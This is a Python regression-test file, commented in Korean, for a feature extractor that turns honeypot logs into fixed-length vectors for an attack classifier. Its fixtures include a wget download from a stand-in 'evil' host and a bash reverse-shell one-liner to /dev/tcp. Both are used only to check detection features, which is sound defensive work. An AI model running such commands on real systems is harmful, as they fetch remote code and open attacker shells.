"""특징 추출 회귀 테스트.

여기서 난 실패는 전부 "예외 없이 0" 이었다. 포트가 0, 명령 길이가 0.
값이 0이면 모델은 그냥 그렇게 학습한다 — 아무도 이상하다고 말해주지 않는다.
"""
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "dist"))

import feature_extract  # noqa: E402

열 = {name: i for i, name in enumerate(feature_extract.FEATURE_COLS)}


def 뽑기(doc: dict, 이름: str):
    return feature_extract.extract(doc)[열[이름]]


# ── 실패 1: int("23.0") 이 예외를 던져 포트가 전부 0 이 됐다 ─────────────
# CSV 로 내보낸 값은 "23.0" 처럼 실수 표기로 온다. int() 는 여기서 ValueError 를
# 던지고, 그 예외를 삼키는 코드가 0 을 넣었다. 라이브 ES 는 정수라 멀쩡했고
# CSV 학습만 망가져서, 학습과 운영이 서로 다른 것을 보는 상태가 됐다.
def test_실수_표기_포트가_0_이_되지_않는다():
    assert 뽑기({"dest_port": "23.0"}, "dst_port") == 23
    assert 뽑기({"dest_port": 23}, "dst_port") == 23
    assert 뽑기({"dest_port": "23"}, "dst_port") == 23
    assert 뽑기({"dest_port": 23.0}, "dst_port") == 23


def test_값이_없거나_쓰레기면_0_이다():
    assert 뽑기({}, "dst_port") == 0
    assert 뽑기({"dest_port": None}, "dst_port") == 0
    assert 뽑기({"dest_port": ""}, "dst_port") == 0
    assert 뽑기({"dest_port": "포트없음"}, "dst_port") == 0


# ── 실패 2: 명령 텍스트를 한 필드에서만 찾았다 ───────────────────────────
# 허니팟마다 명령이 담기는 필드가 다르다. 한 곳만 보면 나머지 허니팟은
# cmd_length 0 · has_wget 0 으로 들어가 특징이 통째로 비어버린다.
def test_명령_텍스트를_허니팟별_필드에서_모두_찾는다():
    for 필드 in ("input", "command", "payload_printable", "payload", "message"):
        doc = {필드: "wget http://evil/x.sh"}
        assert 뽑기(doc, "has_wget") == 1, 필드
        assert 뽑기(doc, "cmd_length") > 0, 필드


def test_리버스셸_특징이_잡힌다():
    doc = {"input": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"}
    assert 뽑기(doc, "has_reverse_shell") == 1
    assert 뽑기(doc, "special_char_cnt") > 0


# ── 특징 벡터의 길이는 계약이다 ─────────────────────────────────────────
# 모델은 고정 길이 벡터를 받는다. 길이가 달라지면 학습·추론이 어긋나는데,
# sklearn 은 그때 예외를 던지지 않고 그냥 다른 답을 낼 수 있다.
def test_벡터_길이는_항상_16_이다():
    assert len(feature_extract.FEATURE_COLS) == 16
    for doc in ({}, {"dest_port": 22}, {"input": "x" * 5000, "protocol": "TCP"}):
        assert len(feature_extract.extract(doc)) == 16


def test_빈_문서에도_예외를_던지지_않는다():
    v = feature_extract.extract({})
    assert all(isinstance(x, (int, float)) for x in v)
